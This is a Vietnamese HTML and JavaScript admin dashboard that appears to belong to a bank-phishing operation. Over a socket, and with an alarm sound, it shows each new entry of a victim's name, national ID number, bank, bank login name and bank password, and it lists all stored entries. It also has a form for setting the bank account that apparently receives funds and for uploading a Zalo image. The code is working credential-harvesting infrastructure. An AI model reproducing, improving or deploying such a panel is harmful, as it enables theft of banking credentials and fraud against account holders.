<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <style>
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            padding: 10px;
            background-color: #f5f5f5;
        }
    </style>
</head>

<body>
    <div class="container-fluid mt-5">
        <div class="row">
            <!-- table -->
            <div class="col-md-6">
                <ul class="nav nav-tabs" id="myTab1" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="home-tab1" data-bs-toggle="tab" data-bs-target="#home1" type="button"
                            role="tab" aria-controls="home" aria-selected="true">
                            Tài khoản mới
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="profile-tab1" data-bs-toggle="tab" data-bs-target="#profile1" type="button"
                            role="tab" aria-controls="profile" aria-selected="false">
                            Tất cả tài khoản
                        </button>
                    </li>
                </ul>
                <div class="tab-content" id="myTabContent1">
                    <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab1">
                        <table class="table table-bordered">
                            <thead>
                                <tr>
                                    <th scope="col">Tên</th>
                                    <th scope="col">CCCD</th>
                                    <th scope="col">Tên ngân hàng</th>
                                    <th scope="col">Tên đăng nhập ngân hàng</th>
                                    <th scope="col">Mật khẩu</th>
                                </tr>
                            </thead>
                            <tbody>
                            </tbody>
                        </table>
                    </div>
                    <div class="tab-pane fade" id="profile1" role="tabpanel" aria-labelledby="profile-tab1">
                        <table class="table table-bordered">
                            <thead>
                                <tr>
                                    <th scope="col">Tên</th>
                                    <th scope="col">CCCD</th>
                                    <th scope="col">Tên ngân hàng</th>
                                    <th scope="col">Tên đăng nhập ngân hàng</th>
                                    <th scope="col">Mật khẩu</th>
                                </tr>
                            </thead>
                            <tbody class="all">
                            </tbody>
                        </table>
                    </div>
                </div>

            </div>
            <div class="col-md-6">
                <ul class="nav nav-tabs" id="myTab" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button"
                            role="tab" aria-controls="home" aria-selected="true">
                            cài đặt tài khoản nhận
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button"
                            role="tab" aria-controls="profile" aria-selected="false">Zalo</button>
                    </li>
                </ul>
                <div class="tab-content" id="myTabContent">
                    <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                        <form class="" method="post">

                            <div class="form-group mb-3">
                                <label for="fullName">Tên chủ sở hữu</label>
                                <input class="form-control" id="fullName" name="fullName">
                            </div>
                            <div class="form-group mb-3">
                                <label for="bankName">Tên tài khoản</label>
                                <select class="form-control" id="bankName" name="bankName">
                                    <option value="MB">MB</option>
                                    <option value="VCB">VCB</option>
                                    <option value="TCB">TCB</option>
                                    <option value="NCB">NCB</option>
                                    <option value="HD">HD</option>
                                    <option value="ACB">ACB</option>
                                </select>
                            </div>

                            <div class="form-group mb-3">
                                <label for="bankAccount">Số tài khoản</label>
                                <input class="form-control" id="bankAccount" name="bankAccount">

                            </div>


                            <div class="form-group mb-3">
                                <label for="bankBranch">Tên chi nhánh</label>
                                <input class="form-control" id="bankBranch" name="bankBranch">
                            </div>

                            <div class="form-group mb-3">
                                <button class="btn btn-primary w-100" type="button" id="btn_change_setting" onclick="updateSetting()">Lưu</button>
                            </div>
                        </form>
                    </div>
                    <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                        <form class="" method="post" enctype="multipart/form-data" action="/api/update-zalo">
                            <div class="form-group mb-3">
                                <label for="zaloImage">Tên chi nhánh</label>
                                <input type="file" class="form-control" id="zaloImage" name="zaloImage">
                            </div>

                            <div class="form-group mb-3">
                                <button class="btn btn-primary w-100" type="submit" id="btn_change_Zalo">Lưu</button>
                            </div>
                        </form>
                    </div>
                    <!-- <div class="tab-pane fade" id="contact" role="tabpanel" aria-labelledby="contact-tab">...</div> -->
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="">
            <div class="d-flex justify-content-around align-items-center">
                <button class="btn btn-warning" onclick="active()">Nhận cảnh báo</button>
                <button class="btn btn-danger" onclick="turnOff()">Tắt cảnh báo</button>
            </div>
        </div>
    </footer>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
    <script src="socket.io/socket.io.js"></script>
    <script src="https://code.jquery.com/jquery-3.7.1.js"
        integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
    <script src="./assets/js.js"></script>
    <script>

        var socket = io();
        const audio = new Audio('assets/canhbao.mp3');

        function active() {
            alert('hello');
        }
        function turnOff() {
            audio.pause();
        }

        socket.on('send-data-admin', async (data) => {
            console.log(data);
            audio.play();
            audio.loop = true;

            $('tbody').append(`
                <tr>
                    <td>${data.fullName}</td>
                    <td>${data.cccd}</td>
                    <td>${data.bankName}</td>
                    <td>${data.bankAccount}</td>
                    <td>${data.bankPassword}</td>
                </tr>
            `)
        })

        const getSetting = () => {
            $.ajax({
                url: '/api/get-setting',
                method: 'GET',

                beforeSend: function () {
                    console.log('beforeSend');
                },

                success: function (data) {
                    console.log(data);
                    $('#fullName').val(data.data.fullName);
                    $('#bankName').val(data.data.bankName);
                    $('#bankAccount').val(data.data.bankAccount);
                    $('#bankBranch').val(data.data.bankBranch);
                },

                error: function (error) {
                    console.log(error);
                },

                complete: function () {
                    console.log('complete');
                }
            })
        }

        getSetting();

        const getUser = () => {
            $.ajax({
                url: '/api/get-user',
                method: 'GET',

                beforeSend: function () {
                    console.log('beforeSend');
                },

                success: function (data) {
                    console.log(data);
                    data.data.forEach(element => {
                        $('tbody.all').append(`
                            <tr>
                                <td>${element.fullName}</td>
                                <td>${element.cccd}</td>
                                <td>${element.bankName}</td>
                                <td>${element.bankAccount}</td>
                                <td>${element.bankPassword}</td>
                            </tr>
                        `)
                    });
                },

                error: function (error) {
                    console.log(error);
                },

                complete: function () {
                    console.log('complete');
                }
            })
        }
        getUser()

        const updateSetting = async () => {
            const fullName = $('#fullName').val();
            const bankName = $('#bankName').val();
            const bankAccount = $('#bankAccount').val();
            const bankBranch = $('#bankBranch').val();

            const data = {
                fullName,
                bankName,
                bankAccount,
                bankBranch
            }

            $.ajax({
                url: '/api/update-setting',
                method: 'POST',
                data,

                beforeSend: function () {
                    console.log('beforeSend');
                    $('#btn_change_setting').html(`Đang lưu...`)
                },

                success: function (data) {
                    $('#btn_change_setting').html(`Lưu`)
                    Swal.fire({
                        title: 'Cập nhật thành công',
                        icon: 'success',
                    })
                },

                error: function (error) {
                    $('#btn_change_setting').html(`Lưu`)
                    console.log(error);
                    Swal.fire({
                        title: 'Cập nhật không thành công',
                        icon: 'error',
                    })
                },

                complete: function () {
                    $('#btn_change_setting').html(`Lưu`)
                    console.log('complete');
                }
            })
        }

        const updateZalo = () => {
            const zaloImage = $('#zaloImage').val();

            const data = {
                zaloImage
            }

            $.ajax({
                url: '/api/update-zalo',
                method: 'POST',
                data,

                beforeSend: function () {
                    console.log('beforeSend');
                    $('#btn_change_Zalo').html(`Đang lưu...`)
                },

                success: function (data) {
                    $('#btn_change_Zalo').html(`Lưu`)
                    Swal.fire({
                        title: 'Cập nhật thành công',
                        icon: 'success',
                    })
                },

                error: function (error) {
                    $('#btn_change_Zalo').html(`Lưu`)
                    console.log(error);
                    Swal.fire({
                        title: 'Cập nhật không thành công',
                        icon: 'error',
                    })
                },

                complete: function () {
                    $('#btn_change_Zalo').html(`Lưu`)
                    console.log('complete');
                }
            })
        }

    </script>
</body>

</html>
